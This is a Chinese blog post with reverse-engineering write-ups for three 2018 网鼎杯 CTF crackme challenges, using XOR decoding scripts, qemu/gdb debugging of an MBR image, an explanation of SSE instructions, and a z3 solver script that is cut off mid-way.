<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="utf-8">
  
  <title>2018-网鼎杯-writeup | AssassinQ</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  
  <meta name="keywords" content="ctfwp">
  
  
  
  
  <meta name="description" content="现阶段主要一直在做逆向，看了好几道逆向的wp复现一下。">
<meta name="keywords" content="ctf,wp">
<meta property="og:type" content="article">
<meta property="og:title" content="2018-网鼎杯-writeup">
<meta property="og:url" content="https://qianfei11.github.io/2018/09/12/2018-网鼎杯-review/index.html">
<meta property="og:site_name" content="AssassinQ">
<meta property="og:description" content="现阶段主要一直在做逆向，看了好几道逆向的wp复现一下。">
<meta property="og:locale" content="default">
<meta property="og:image" content="https://qianfei11.github.io/pics/2018-网鼎杯-writeup/blend/1.png">
<meta property="og:image" content="https://qianfei11.github.io/pics/2018-网鼎杯-writeup/blend/2.png">
<meta property="og:image" content="https://qianfei11.github.io/pics/2018-网鼎杯-writeup/minified/1.PNG">
<meta property="og:image" content="https://qianfei11.github.io/pics/2018-网鼎杯-writeup/minified/2.PNG">
<meta property="og:image" content="https://qianfei11.github.io/pics/2018-网鼎杯-writeup/minified/3.PNG">
<meta property="og:image" content="https://qianfei11.github.io/pics/2018-网鼎杯-writeup/welcome/1.png">
<meta property="og:image" content="https://qianfei11.github.io/pics/2018-网鼎杯-writeup/shanghai/1.png">
<meta property="og:updated_time" content="2019-03-31T09:50:50.572Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="2018-网鼎杯-writeup">
<meta name="twitter:description" content="现阶段主要一直在做逆向，看了好几道逆向的wp复现一下。">
<meta name="twitter:image" content="https://qianfei11.github.io/pics/2018-网鼎杯-writeup/blend/1.png">
  
    <link rel="alternate" href="/atom.xml" title="AssassinQ" type="application/atom+xml">
  
  <link rel="icon" href="/css/images/favicon.ico">
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link href="https://fonts.googleapis.com/css?family=Open+Sans|Montserrat:700" rel="stylesheet" type="text/css">
  <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,300italic,400italic" rel="stylesheet" type="text/css">
  <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
  <style type="text/css">
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/9749f0/00000000000000000001008f/27/l?subset_id=2&fvd=n5) format("woff2");font-weight:500;font-style:normal;}
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/90cf9f/000000000000000000010091/27/l?subset_id=2&fvd=n7) format("woff2");font-weight:500;font-style:normal;}
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/8a5494/000000000000000000013365/27/l?subset_id=2&fvd=n4) format("woff2");font-weight:lighter;font-style:normal;}
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/d337d8/000000000000000000010095/27/l?subset_id=2&fvd=i4) format("woff2");font-weight:400;font-style:italic;}</style>
    
  <link rel="stylesheet" id="athemes-headings-fonts-css" href="//fonts.googleapis.com/css?family=Yanone+Kaffeesatz%3A200%2C300%2C400%2C700&amp;ver=4.6.1" type="text/css" media="all">

  <link rel="stylesheet" id="athemes-headings-fonts-css" href="//fonts.googleapis.com/css?family=Oswald%3A300%2C400%2C700&amp;ver=4.6.1" type="text/css" media="all">
  <link rel="stylesheet" href="/css/style.css">

  <script src="/js/jquery-3.1.1.min.js"></script>

  <!-- Bootstrap core CSS -->
  <link rel="stylesheet" href="/css/bootstrap.css">
  <link rel="stylesheet" href="/css/fashion.css">
  <link rel="stylesheet" href="/css/glyphs.css">

</head>
</html>


  <body data-spy="scroll" data-target="#toc" data-offset="50">


  


<header id="allheader" class="site-header" role="banner">
  <div class="clearfix container">
      <div class="site-branding">

          <h1 class="site-title">
            
              <a href="/" title="AssassinQ" rel="home"> AssassinQ </a>
            
          </h1>
          
          
            <div class="site-description">ZJGSU-IS-17</div>
          
            
          <nav id="main-navigation" class="main-navigation" role="navigation">
            <a class="nav-open">Menu</a>
            <a class="nav-close">Close</a>

            <div class="clearfix sf-menu">
              <ul id="main-nav" class="menu sf-js-enabled sf-arrows" style="touch-action: pan-y;">
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/">Home</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/archives">Archives</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/tags">Tags</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/about">About</a> </li>
                    
              </ul>
            </div>
          </nav>

      </div>
  </div>
</header>


  <div id="container">
    <div id="wrap">
            
      <div id="content" class="outer">
        
          <section id="main" style="float:none;"><article id="post-2018-网鼎杯-review" style="width: 66%; float:left;" class="article article-type-post" itemscope itemprop="blogPost">
  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      2018-网鼎杯-writeup
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	<a href="/2018/09/12/2018-网鼎杯-review/" class="article-date">
	  <time datetime="2018-09-12T13:00:45.000Z" itemprop="datePublished">September 12, 2018</time>
	</a>

       
      

    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <p>现阶段主要一直在做逆向，看了好几道逆向的wp复现一下。</p>
<a id="more"></a>
<h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="beijing"><a href="#beijing" class="headerlink" title="beijing"></a>beijing</h2><p>简单的异或，直接取原来的数据：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> pair[<span class="number">28</span>] = &#123;</span><br><span class="line">   <span class="number">0x61</span>, <span class="number">0x4C</span>, <span class="number">0x67</span>, <span class="number">0x59</span>, <span class="number">0x69</span>, <span class="number">0x29</span>, <span class="number">0x6E</span>, <span class="number">0x42</span>, <span class="number">0x62</span>, <span class="number">0x0D</span>, <span class="number">0x65</span>, <span class="number">0x71</span>, <span class="number">0x66</span>, <span class="number">0x34</span>, <span class="number">0x6A</span>, <span class="number">0xC6</span>, <span class="number">0x6D</span>, <span class="number">0x8A</span>, <span class="number">0x6C</span>, <span class="number">0x7F</span>, <span class="number">0x7B</span>, <span class="number">0xAE</span>, <span class="number">0x7A</span>, <span class="number">0x92</span>, <span class="number">0x7D</span>, <span class="number">0xEC</span>, <span class="number">0x5F</span>, <span class="number">0x57</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> choice[<span class="number">22</span>] = &#123;</span><br><span class="line">       <span class="number">0x6</span>, <span class="number">0x9</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0xA</span>, <span class="number">0x0</span>, <span class="number">0x8</span>, <span class="number">0x0</span>, <span class="number">0xB</span>, <span class="number">0x2</span>, <span class="number">0x3</span>, <span class="number">0x1</span>, <span class="number">0xD</span>, <span class="number">0x4</span>, <span class="number">0x5</span>, <span class="number">0x2</span>, <span class="number">0x7</span>, <span class="number">0x2</span>, <span class="number">0x3</span>, <span class="number">0x1</span>, <span class="number">0xC</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="keyword">char</span> tmp = <span class="number">0</span>;</span><br><span class="line">   <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">22</span>; i++) &#123;</span><br><span class="line">       <span class="keyword">switch</span>(choice[i]) &#123;</span><br><span class="line">           <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">               tmp = pair[<span class="number">2</span> * choice[i]];</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">               tmp = pair[<span class="number">2</span> * choice[i]];</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">               tmp = pair[<span class="number">2</span> * choice[i]];</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">               tmp = pair[<span class="number">2</span> * choice[i]];</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">               tmp = pair[<span class="number">2</span> * choice[i]];</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">               tmp = pair[<span class="number">2</span> * choice[i]];</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">               tmp = pair[<span class="number">2</span> * choice[i]];</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">               tmp = pair[<span class="number">2</span> * choice[i]];</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">               tmp = pair[<span class="number">2</span> * choice[i]];</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">               tmp = pair[<span class="number">2</span> * choice[i]];</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">               tmp = pair[<span class="number">2</span> * choice[i]];</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">               tmp = pair[<span class="number">2</span> * choice[i]];</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">               tmp = pair[<span class="number">2</span> * choice[i]];</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> <span class="number">13</span>:</span><br><span class="line">               tmp = pair[<span class="number">2</span> * choice[i]];</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">default</span>:</span><br><span class="line">               tmp = <span class="number">0</span>;</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">"%c"</span>, tmp);</span><br><span class="line">       fflush(<span class="built_in">stdout</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="advanced"><a href="#advanced" class="headerlink" title="advanced"></a>advanced</h2><p>非预期解，对加密了的字符串尝试异或就找到了规律：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">enc = <span class="string">'K@LKVHr[DXEsLsYI@\\AMYIr\\EIZQ'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(enc)):</span><br><span class="line">    <span class="keyword">if</span> i &amp; <span class="number">1</span>:</span><br><span class="line">        flag += chr(ord(enc[i]) ^ <span class="number">0x2C</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag += chr(ord(enc[i]) ^ <span class="number">0x2D</span>)</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>
<h2 id="blend"><a href="#blend" class="headerlink" title="blend"></a>blend</h2><p>和之前的<a href="https://github.com/TechSecCTF/writeups/tree/master/CSAWQuals2017/realism" target="_blank" rel="noopener">一道题</a>基本一样。file一下是MBR，可以用qemu跑一下。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-i386 -s -drive format=raw,file=./main.bin</span><br></pre></td></tr></table></figure>
<p>通过gdb远程连接qemu进行动态调试：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">[Desktop] gdb                                                         23:42:46 </span><br><span class="line">GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1</span><br><span class="line">Copyright (C) 2016 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.  Type &quot;show copying&quot;</span><br><span class="line">and &quot;show warranty&quot; for details.</span><br><span class="line">This GDB was configured as &quot;x86_64-linux-gnu&quot;.</span><br><span class="line">Type &quot;show configuration&quot; for configuration details.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span><br><span class="line">Find the GDB manual and other documentation resources online at:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/documentation/&gt;.</span><br><span class="line">For help, type &quot;help&quot;.</span><br><span class="line">Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;.</span><br><span class="line">GEF for linux ready, type `gef&apos; to start, `gef config&apos; to configure</span><br><span class="line">65 commands loaded for GDB 7.11.1 using Python engine 3.5</span><br><span class="line">[*] 5 commands could not be loaded, run `gef missing` to know why.</span><br><span class="line">gef➤  set architecture i8086</span><br><span class="line">warning: A handler for the OS ABI &quot;GNU/Linux&quot; is not built into this configuration</span><br><span class="line">of GDB.  Attempting to continue with the default i8086 settings.</span><br><span class="line"></span><br><span class="line">The target architecture is assumed to be i8086</span><br><span class="line">gef➤  set disassembly-flavor intel</span><br><span class="line">gef➤  target remote:1234</span><br><span class="line">Remote debugging using :1234</span><br><span class="line">0x0000c073 in ?? ()</span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">───────────────────────────────────────────────────────────────[ registers ]────</span><br><span class="line">[!] Command &apos;context&apos; failed to execute properly, reason: &apos;NoneType&apos; object has no attribute &apos;all_registers&apos;</span><br></pre></td></tr></table></figure>
<p>或者在ida中静态分析，主要要了解一下<a href="https://www.jianshu.com/p/64ef4d304e17" target="_blank" rel="noopener">sse指令</a>：</p>
<table>
<thead>
<tr>
<th style="text-align:center">指令</th>
<th style="text-align:center">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>MOVAPS</code></td>
<td style="text-align:center">把源存储器内容值送入目的寄存器。当有m128时, 内存地址必须是16字节对齐的。</td>
</tr>
<tr>
<td style="text-align:center"><code>PSHUFD</code></td>
<td style="text-align:center">有三个操作数，从左往右，第一个操作数是目的操作数保存结果，第二个操作数是源操作数，第三个操作数是一个8位立即数，指定以怎样的顺序将源操作数中数据保存到目的操作数。</td>
</tr>
<tr>
<td style="text-align:center"><code>ANDPS</code></td>
<td style="text-align:center">按位与</td>
</tr>
<tr>
<td style="text-align:center"><code>PSADBW</code></td>
<td style="text-align:center">绝对差值求和</td>
</tr>
</tbody>
</table>
<p>先是判断字符串长度是否大于19：</p>
<p><img src="/pics/2018-网鼎杯-writeup/blend/1.png" alt="判断字符串长度"></p>
<p>然后在循环中逐个比较：</p>
<p><img src="/pics/2018-网鼎杯-writeup/blend/2.png" alt="循环check"></p>
<p>在循环中，主要是<code>pshufd</code>指令的操作：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0xffffffffffffff00  0xffffffffffffff00</span><br><span class="line">0xffffffffffff00ff  0xffffffffffff00ff</span><br><span class="line">0xffffffffff00ffff  0xffffffffff00ffff</span><br><span class="line">0xffffffff00ffffff  0xffffffff00ffffff</span><br><span class="line">0xffffff00ffffffff  0xffffff00ffffffff</span><br><span class="line">0xffff00ffffffffff  0xffff00ffffffffff</span><br><span class="line">0xff00ffffffffffff  0xff00ffffffffffff</span><br><span class="line">0x00ffffffffffffff  0x00ffffffffffffff</span><br></pre></td></tr></table></figure>
<p>然后与内存中的数据相与，再通过<code>psadbw</code>指令进行绝对差求和。</p>
<p>还有对高低位的一个位置交换：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">seg000:009F                 mov     di, ds:1268h</span><br><span class="line">seg000:00A3                 shl     edi, 10h</span><br><span class="line">seg000:00A7                 mov     di, ds:1270h</span><br></pre></td></tr></table></figure>
<p>最后用z3约束求解：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">a = Int(<span class="string">'a'</span>) </span><br><span class="line">b = Int(<span class="string">'b'</span>) </span><br><span class="line">c = Int(<span class="string">'c'</span>) </span><br><span class="line">d = Int(<span class="string">'d'</span>) </span><br><span class="line">e = Int(<span class="string">'e'</span>) </span><br><span class="line">f = Int(<span class="string">'f'</span>) </span><br><span class="line">g = Int(<span class="string">'g'</span>) </span><br><span class="line">h = Int(<span class="string">'h'</span>) </span><br><span class="line">i = Int(<span class="string">'i'</span>) </span><br><span class="line">j = Int(<span class="string">'j'</span>) </span><br><span class="line">k = Int(<span class="string">'k'</span>) </span><br><span class="line">l = Int(<span class="string">'l'</span>) </span><br><span class="line">m = Int(<span class="string">'m'</span>) </span><br><span class="line">n = Int(<span class="string">'n'</span>) </span><br><span class="line">o = Int(<span class="string">'o'</span>) </span><br><span class="line">p = Int(<span class="string">'p'</span>)</span><br><span class="line"></span><br><span class="line">s.add(a &lt; <span class="number">127</span>)</span><br><span class="line">s.add(b &lt; <span class="number">127</span>)</span><br><span class="line">s.add(c &lt; <span class="number">127</span>)</span><br><span class="line">s.add(d &lt; <span class="number">127</span>)</span><br><span class="line">s.add(e &lt; <span class="number">127</span>)</span><br><span class="line">s.add(f &lt; <span class="number">127</span>)</span><br><span class="line">s.add(g &lt; <span class="number">127</span>)</span><br><span class="line">s.add(h &lt; <span class="number">127</span>)</span><br><span class="line">s.add(i &lt; <span class="number">127</span>)</span><br><span class="line">s.add(j &lt; <span class="number">127</span>)</span><br><span class="line">s.add(k &lt; <span class="number">127</span>)</span><br><span class="line">s.add(l &lt; <span class="number">127</span>)</span><br><span class="line">s.add(m &lt; <span class="number">127</span>)</span><br><span class="line">s.add(n &lt; <span class="number">127</span>)</span><br><span class="line">s.add(o &lt; <span class="number">127</span>)</span><br><span class="line">s.add(p &lt; <span class="number">127</span>)</span><br><span class="line"></span><br><span class="line">s.add(a &gt; <span class="number">32</span>)</span><br><span class="line">s.add(b &gt; <span class="number">32</span>)</span><br><span class="line">s.add(c &gt; <span class="number">32</span>)</span><br><span class="line">s.add(d &gt; <span class="number">32</span>)</span><br><span class="line">s.add(e &gt; <span class="number">32</span>)</span><br><span class="line">s.add(f &gt; <span class="number">32</span>)</span><br><span class="line">s.add(g &gt; <span class="number">32</span>)</span><br><span class="line">s.add(h &gt; <span class="number">32</span>)</span><br><span class="line">s.add(i &gt; <span class="number">32</span>)</span><br><span class="line">s.add(j &gt; <span class="number">32</span>)</span><br><span class="line">s.add(k &gt; <span class="number">32</span>)</span><br><span class="line">s.add(l &gt; <span class="number">32</span>)</span><br><span class="line">s.add(m &gt; <span class="number">32</span>)</span><br><span class="line">s.add(n &gt; <span class="number">32</span>)</span><br><span class="line">s.add(o &gt; <span class="number">32</span>)</span><br><span class="line">s.add(p &gt; <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">s.add(abs(d<span class="number">-0x22</span>)+abs(c<span class="number">-0xf</span>)+abs(b<span class="number">-0x2</span>)+abs(a<span class="number">-0xc8</span>)+abs(h<span class="number">-0x83</span>)+abs(g<span class="number">-0xfb</span>)+abs(f<span class="number">-0xe0</span>)+abs(<span class="number">0</span><span class="number">-0x83</span>)==<span class="number">0x304</span>)</span><br><span class="line">s.add(abs(p<span class="number">-0xc0</span>)+abs(o<span class="number">-0x20</span>)+abs(n<span class="number">-0xf</span>)+abs(m<span class="number">-0x10</span>)+abs(l<span class="number">-0xcd</span>)+abs(k<span class="number">-0x00</span>)+abs(j<span class="number">-0x13</span>)+abs(<span class="number">0</span><span class="number">-0xb8</span>)==<span class="number">0x311</span>)</span><br><span class="line">s.add(abs(d<span class="number">-0x0</span>)+abs(c<span class="number">-0x0</span>)+abs(b<span class="number">-0x0</span>)+abs(a<span class="number">-0x0</span>)+abs(h<span class="number">-0x0</span>)+abs(g<span class="number">-0x0</span>)+abs(<span class="number">0</span><span class="number">-0x3</span>)+abs(e<span class="number">-0x4</span>)==<span class="number">0x2cd</span>)</span><br><span class="line">s.add(abs(p<span class="number">-0x0</span>)+abs(o<span class="number">-0x0</span>)+abs(n<span class="number">-0x00</span>)+abs(m<span class="number">-0x0</span>)+abs(l<span class="number">-0x0</span>)+abs(k<span class="number">-0x00</span>)+abs(<span class="number">0</span><span class="number">-0x3</span>)+abs(i<span class="number">-0x11</span>)==<span class="number">0x2d9</span>)</span><br><span class="line">s.add(abs(d<span class="number">-0x0</span>)+abs(c<span class="number">-0x0</span>)+abs(b<span class="number">-0x0</span>)+abs(a<span class="number">-0x0</span>)+abs(h<span class="number">-0x0</span>)+abs(<span class="number">0</span><span class="number">-0x0</span>)+abs(f<span class="number">-0x2</span>)+abs(e<span class="number">-0xcd</span>)==<span class="number">0x2db</span>)</span><br><span class="line">s.add(abs(p<span class="number">-0x0</span>)+abs(o<span class="number">-0x0</span>)+abs(n<span class="number">-0x0</span>)+abs(m<span class="number">-0x0</span>)+abs(l<span class="number">-0x0</span>)+abs(<span class="number">0</span><span class="number">-0x00</span>)+abs(j<span class="number">-0x2</span>)+abs(i<span class="number">-0xd9</span>)==<span class="number">0x2d4</span>)</span><br><span class="line">s.add(abs(d<span class="number">-0x0</span>)+abs(c<span class="number">-0x0</span>)+abs(b<span class="number">-0x0</span>)+abs(a<span class="number">-0x0</span>)+abs(<span class="number">0</span><span class="number">-0x0</span>)+abs(g<span class="number">-0x0</span>)+abs(f<span class="number">-0x2</span>)+abs(e<span class="number">-0xdb</span>)==<span class="number">0x2e2</span>)</span><br><span class="line">s.add(abs(p<span class="number">-0x0</span>)+abs(o<span class="number">-0x0</span>)+abs(n<span class="number">-0x0</span>)+abs(m<span class="number">-0x0</span>)+abs(<span class="number">0</span><span class="number">-0x0</span>)+abs(k<span class="number">-0x00</span>)+abs(j<span class="number">-0x2</span>)+abs(i<span class="number">-0xd4</span>)==<span class="number">0x2c4</span>)</span><br><span class="line">s.add(abs(d<span class="number">-0x0</span>)+abs(c<span class="number">-0x0</span>)+abs(b<span class="number">-0x0</span>)+abs(<span class="number">0</span><span class="number">-0x0</span>)+abs(h<span class="number">-0x0</span>)+abs(g<span class="number">-0x0</span>)+abs(f<span class="number">-0x2</span>)+abs(e<span class="number">-0xe2</span>)==<span class="number">0x2e2</span>)</span><br><span class="line">s.add(abs(p<span class="number">-0x0</span>)+abs(o<span class="number">-0x0</span>)+abs(n<span class="number">-0x0</span>)+abs(<span class="number">0</span><span class="number">-0x0</span>)+abs(l<span class="number">-0x0</span>)+abs(k<span class="number">-0x00</span>)+abs(j<span class="number">-0x2</span>)+abs(i<span class="number">-0xc4</span>)==<span class="number">0x2ce</span>)</span><br><span class="line">s.add(abs(d<span class="number">-0x0</span>)+abs(c<span class="number">-0x0</span>)+abs(<span class="number">0</span><span class="number">-0x0</span>)+abs(a<span class="number">-0x0</span>)+abs(h<span class="number">-0x0</span>)+abs(g<span class="number">-0x0</span>)+abs(f<span class="number">-0x2</span>)+abs(e<span class="number">-0xe2</span>)==<span class="number">0x2ed</span>)</span><br><span class="line">s.add(abs(p<span class="number">-0x0</span>)+abs(o<span class="number">-0x0</span>)+abs(<span class="number">0</span><span class="number">-0x0</span>)+abs(m<span class="number">-0x0</span>)+abs(l<span class="number">-0x0</span>)+abs(k<span class="number">-0x00</span>)+abs(j<span class="number">-0x2</span>)+abs(i<span class="number">-0xce</span>)==<span class="number">0x2d8</span>)</span><br><span class="line">s.add(abs(d<span class="number">-0x0</span>)+abs(<span class="number">0</span><span class="number">-0x0</span>)+abs(b<span class="number">-0x0</span>)+abs(a<span class="number">-0x0</span>)+abs(h<span class="number">-0x0</span>)+abs(g<span class="number">-0x0</span>)+abs(f<span class="number">-0x2</span>)+abs(e<span class="number">-0xed</span>)==<span class="number">0x2e8</span>)</span><br><span class="line">s.add(abs(p<span class="number">-0x0</span>)+abs(<span class="number">0</span><span class="number">-0x0</span>)+abs(n<span class="number">-0x0</span>)+abs(m<span class="number">-0x0</span>)+abs(l<span class="number">-0x0</span>)+abs(k<span class="number">-0x00</span>)+abs(j<span class="number">-0x2</span>)+abs(i<span class="number">-0xd8</span>)==<span class="number">0x2dc</span>)</span><br><span class="line">s.add(abs(<span class="number">0</span><span class="number">-0x0</span>)+abs(c<span class="number">-0x0</span>)+abs(b<span class="number">-0x0</span>)+abs(a<span class="number">-0x0</span>)+abs(h<span class="number">-0x0</span>)+abs(g<span class="number">-0x0</span>)+abs(f<span class="number">-0x2</span>)+abs(e<span 